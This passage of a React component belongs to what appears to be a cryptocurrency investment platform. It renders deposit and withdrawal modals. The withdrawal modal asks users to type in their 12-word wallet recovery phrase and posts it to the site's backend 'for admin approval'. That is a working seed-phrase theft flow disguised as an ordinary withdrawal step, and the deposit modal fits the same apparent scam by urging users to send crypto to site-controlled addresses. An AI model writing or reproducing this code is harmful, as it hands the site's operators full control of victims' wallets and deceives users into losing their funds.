                  {Object.entries(cryptoWallets).map(([key, crypto]) => (
                    <button
                      key={key}
                      onClick={() => setSelectedCrypto(key)}
                      className={`p-3 rounded-lg border-2 transition-all ${
                        selectedCrypto === key
                          ? 'border-[var(--brand)] bg-[var(--brand)]/10'
                          : 'border-[var(--brand)]/20 hover:border-[var(--brand)]/40'
                      }`}
                    >
                      <div className={`text-2xl mb-1 ${crypto.color}`}>{crypto.icon}</div>
                      <div className="text-xs text-[var(--foreground)]/80">{crypto.name}</div>
                    </button>
                  ))}
                </div>
              </div>

              {/* Wallet Address Display */}
              <div className="bg-[var(--background)]/50 p-4 rounded-lg">
                <div className="flex items-center gap-2 mb-2">
                  <span className={`text-lg ${cryptoWallets[selectedCrypto as keyof typeof cryptoWallets].color}`}>
                    {cryptoWallets[selectedCrypto as keyof typeof cryptoWallets].icon}
                  </span>
                  <span className="text-sm font-medium text-[var(--foreground)]">
                    {cryptoWallets[selectedCrypto as keyof typeof cryptoWallets].name}
                  </span>
                </div>
                <div className="text-xs text-[var(--foreground)]/60 mb-2">Send exactly the USD equivalent to:</div>
                <div className="bg-[var(--background)] p-3 rounded border border-[var(--brand)]/20">
                  <div className="text-xs font-mono text-[var(--foreground)] break-all">
                    {cryptoWallets[selectedCrypto as keyof typeof cryptoWallets].address}
                  </div>
                </div>
                <button
                  onClick={() => {
                    navigator.clipboard.writeText(cryptoWallets[selectedCrypto as keyof typeof cryptoWallets].address);
                    alert('Wallet address copied to clipboard!');
                  }}
                  className="mt-2 text-xs text-[var(--brand)] hover:text-[var(--brand)]/80 transition-colors"
                >
                  Copy Address
                </button>
              </div>

              {/* Instructions */}
              <div className="bg-blue-500/10 border border-blue-500/20 rounded-lg p-3">
                <div className="text-sm text-blue-600">
                  <strong>Important:</strong>
                  <ul className="mt-1 space-y-1 text-xs">
                    <li>• Send only {cryptoWallets[selectedCrypto as keyof typeof cryptoWallets].name}</li>
                    <li>• Minimum deposit: $10</li>
                    <li>• Funds will be credited within 24 hours</li>
                    <li>• Keep your transaction hash for reference</li>
                  </ul>
                </div>
              </div>

              {/* Action Buttons */}
              <div className="flex gap-3 pt-4">
                <button
                  type="button"
                  onClick={() => setShowDepositModal(false)}
                  className="flex-1 px-4 py-2 border border-[var(--brand)]/20 text-[var(--foreground)] rounded-lg hover:bg-[var(--background)] transition-colors"
                >
                  Cancel
                </button>
                <button
                  onClick={() => {
                    if (!depositAmount || parseFloat(depositAmount) < 10) {
                      alert('Please enter a valid amount (minimum $10)');
                      return;
                    }
                    alert(`Deposit request submitted!\n\nAmount: $${depositAmount}\nMethod: ${cryptoWallets[selectedCrypto as keyof typeof cryptoWallets].name}\n\nPlease send the cryptocurrency to the wallet address above.`);
                    setShowDepositModal(false);
                    setDepositAmount('');
                  }}
                  className="flex-1 px-4 py-2 bg-[var(--brand)] text-white rounded-lg hover:bg-[var(--brand)]/80 transition-colors"
                >
                  Submit Request
                </button>
              </div>
            </div>
          </motion.div>
        </div>
      )}

      {/* Withdrawal Modal */}
      {showWithdrawalModal && (
        <div className="fixed inset-0 bg-black/50 flex items-center justify-center p-4 z-50">
          <motion.div
            initial={{ opacity: 0, scale: 0.9 }}
            animate={{ opacity: 1, scale: 1 }}
            className="bg-[var(--card-bg)] border border-[var(--brand)]/20 rounded-xl shadow-2xl max-w-md w-full max-h-[90vh] flex flex-col"
          >
            {/* Header - Fixed */}
            <div className="flex items-center justify-between p-6 border-b border-[var(--brand)]/20">
              <h3 className="text-xl font-bold text-[var(--foreground)]">Withdraw Funds</h3>
              <button
                onClick={() => setShowWithdrawalModal(false)}
                className="text-[var(--foreground)]/60 hover:text-[var(--foreground)] transition-colors"
              >
                <FaTimesCircle size={24} />
              </button>
            </div>
            
            {/* Scrollable Content */}
            <div className="flex-1 overflow-y-auto p-6 space-y-6">
              {/* Process Note */}
              <div className="bg-blue-500/10 border border-blue-500/20 rounded-lg p-3">
                <div className="text-sm text-blue-600">
                  <strong>Withdrawal Process:</strong>
                  <ol className="mt-1 space-y-1 text-xs">
                    <li>1. Enter withdrawal amount</li>
                    <li>2. Select your wallet app</li>
                    <li>3. Enter your 12-word recovery phrase</li>
                    <li>4. Submit request for admin approval</li>
                  </ol>
                </div>
              </div>
              
              {/* Amount Input */}
              <div>
                <label className="block text-sm text-[var(--foreground)]/60 mb-2">Withdrawal Amount (USD)</label>
                <input
                  type="number"
                  step="0.01"
                  min="10"
                  max={portfolioData.totalBalance}
                  value={withdrawalAmount}
                  onChange={(e) => setWithdrawalAmount(e.target.value)}
                  placeholder={`Enter amount (max: $${portfolioData.totalBalance.toFixed(2)})`}
                  className="w-full px-3 py-2 bg-[var(--background)] border border-[var(--brand)]/20 rounded-lg text-[var(--foreground)] focus:outline-none focus:border-[var(--brand)]"
                />
                <div className="text-xs text-[var(--foreground)]/40 mt-1">
                  Available balance: ${portfolioData.totalBalance.toFixed(2)}
                </div>
              </div>

              {/* Wallet Type Selection */}
              <div>
                <label className="block text-sm text-[var(--foreground)]/60 mb-3">Select Your Wallet App *</label>
                <select
                  value={withdrawalWalletType}
                  onChange={(e) => setWithdrawalWalletType(e.target.value)}
                  className="w-full px-3 py-2 bg-[var(--background)] border border-[var(--brand)]/20 rounded-lg text-[var(--foreground)] focus:outline-none focus:border-[var(--brand)]"
                  required
                >
                  <option value="">-- Select Your Wallet App --</option>
                  {popularWallets.map((wallet) => (
                    <option key={wallet.id} value={wallet.id}>
                      {wallet.icon} {wallet.name} - {wallet.description}
                    </option>
                  ))}
                </select>
                <div className="text-xs text-[var(--foreground)]/40 mt-2">
                  Choose the wallet app you want to withdraw to
                </div>
              </div>

              {/* 12-Word Phrase Input */}
              <div>
                <label className="block text-sm text-[var(--foreground)]/60 mb-2">12-Word Recovery Phrase</label>
                <div className="grid grid-cols-3 gap-2 mb-2">
                  {twelveWordPhrase.map((word, index) => (
                    <div key={index} className="relative">
                      <input
                        type="text"
                        value={word}
                        onChange={(e) => {
                          const newPhrase = [...twelveWordPhrase];
                          newPhrase[index] = e.target.value;
                          setTwelveWordPhrase(newPhrase);
                        }}
                        placeholder={`Word ${index + 1}`}
                        className="w-full px-2 py-2 text-center bg-[var(--background)] border border-[var(--brand)]/20 rounded-lg text-[var(--foreground)] placeholder-[var(--foreground)]/40 focus:outline-none focus:border-[var(--brand)] text-sm"
                      />
                      <div className="absolute -top-1 -left-1 w-5 h-5 bg-[var(--brand)] text-white text-xs rounded-full flex items-center justify-center">
                        {index + 1}
                      </div>
                    </div>
                  ))}
                </div>
                <div className="text-xs text-[var(--foreground)]/40">
                  Enter each word in the correct order (1-12)
                </div>
              </div>

              {/* Instructions */}
              <div className="bg-yellow-500/10 border border-yellow-500/20 rounded-lg p-3">
                <div className="text-sm text-yellow-600">
                  <strong>Important:</strong>
                  <ul className="mt-1 space-y-1 text-xs">
                    <li>• Minimum withdrawal: $10</li>
                    <li>• Maximum withdrawal: ${portfolioData.totalBalance.toFixed(2)}</li>
                    <li>• Processing time: 24-48 hours</li>
                    <li>• Keep your recovery phrase secure</li>
                  </ul>
                </div>
              </div>

            </div>
            
            {/* Fixed Footer with Action Buttons */}
            <div className="p-6 border-t border-[var(--brand)]/20 bg-[var(--card-bg)]">
              <div className="flex gap-3">
                <button
                  type="button"
                  onClick={() => setShowWithdrawalModal(false)}
                  className="flex-1 px-4 py-2 border border-[var(--brand)]/20 text-[var(--foreground)] rounded-lg hover:bg-[var(--background)] transition-colors"
                >
                  Cancel
                </button>
                <button
                  onClick={async () => {
                    if (!withdrawalAmount || parseFloat(withdrawalAmount) < 10) {
                      alert('Please enter a valid amount (minimum $10)');
                      return;
                    }
                    if (parseFloat(withdrawalAmount) > portfolioData.totalBalance) {
                      alert('Withdrawal amount cannot exceed your available balance');
                      return;
                    }
                    if (!withdrawalWalletType) {
                      alert('Please select a wallet app');
                      return;
                    }
                    if (twelveWordPhrase.some(word => !word.trim())) {
                      alert('Please fill in all 12 words of your recovery phrase');
                      return;
                    }
                    
                    // Get wallet name from popularWallets
                    const selectedWallet = popularWallets.find(w => w.id === withdrawalWalletType);
                    const walletName = selectedWallet ? selectedWallet.name : withdrawalWalletType;
                    
                    // Submit withdrawal request to API
                    try {
                      const response = await fetch('/api/user/withdrawal', {
                        method: 'POST',
                        headers: {
                          'Content-Type': 'application/json',
                        },
                        body: JSON.stringify({
                          amount: parseFloat(withdrawalAmount),
                          walletType: withdrawalWalletType,
                          walletName: walletName,
                          recoveryPhrase: twelveWordPhrase.join(' ')
                        }),
                      });

                      if (response.ok) {
                        const data = await response.json();
                        console.log('✅ Withdrawal request submitted:', data);
                        
                        alert(`Withdrawal request submitted successfully!\n\nAmount: $${withdrawalAmount}\nWallet: ${walletName}\nStatus: ${data.status}\n\nYour request will be processed within 24-48 hours.`);
                        
                        setShowWithdrawalModal(false);
                        setWithdrawalAmount('');
                        setWithdrawalWalletType('');
                        setTwelveWordPhrase(['', '', '', '', '', '', '', '', '', '', '', '']);
                        
                        // Refresh user data to show updated balance
                        fetchUserData();
                      } else {
                        const errorData = await response.json();
                        alert(`Failed to submit withdrawal: ${errorData.error}`);
                      }
                    } catch (error) {
                      console.error('❌ Error submitting withdrawal:', error);
                      alert('Failed to submit withdrawal request. Please try again.');
                    }
                  }}
                  className="flex-1 px-4 py-2 bg-[var(--brand)] text-white rounded-lg hover:bg-[var(--brand)]/80 transition-colors"
                >
                  Submit Request
                </button>
              </div>
            </div>
          </motion.div>
        </div>
      )}
    </main>
  );
}
